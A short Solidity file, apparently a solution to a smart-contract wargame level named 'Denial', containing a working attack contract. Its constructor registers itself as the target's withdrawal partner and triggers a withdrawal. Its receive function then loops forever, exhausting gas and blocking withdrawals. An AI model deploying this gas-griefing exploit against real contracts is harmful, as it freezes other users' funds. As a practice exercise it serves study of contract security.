// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract Attack{
    constructor(address target){
        Denial(target).setWithdrawPartner(address(this));
        Denial(target).withdraw();
    }

    receive() external payable{
        while(true){
        }
    }
}